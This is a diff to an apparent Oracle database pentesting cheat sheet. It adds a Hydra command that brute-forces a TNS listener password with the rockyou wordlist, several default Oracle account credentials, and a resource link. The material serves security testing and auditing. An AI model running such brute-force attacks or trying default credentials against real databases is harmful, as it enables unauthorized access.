@@ -110,6 +110,14 @@ auxiliary/scanner/oracle/tnslsnr_version
 auxiliary/scanner/oracle/sid_enum
 ```
 
+### Hydra
+
+brute-force a listener password if exists:
+
+```text
+./hydra -P rockyou.txt -t 32 -s 1521 host.victim oracle-listener
+```
+
 ## Default accounts
 
 | Username  | Password  |
@@ -118,6 +126,9 @@ auxiliary/scanner/oracle/sid_enum
 | SYS  | CHANGE\_ON\_INSTALL  |
 | DBSNMP  | DBSNMP  |
 | SCOTT  | TIGER  |
+| PCMS\_SYS | PCMS\_SYS |
+| WMSYS | WMSYS |
+| OUTLN | OUTLN |
 
 ## Connecting to Oracle DB
 
@@ -152,4 +163,8 @@ SQL>
 **Remove the exploit using:** 
 
 `drop index exploit_1337;` 
+
+## Resources:
+
+[https://medium.com/@netscylla/oracle-hacks-part-2-b1ccb1916d1f](https://medium.com/@netscylla/oracle-hacks-part-2-b1ccb1916d1f)
 
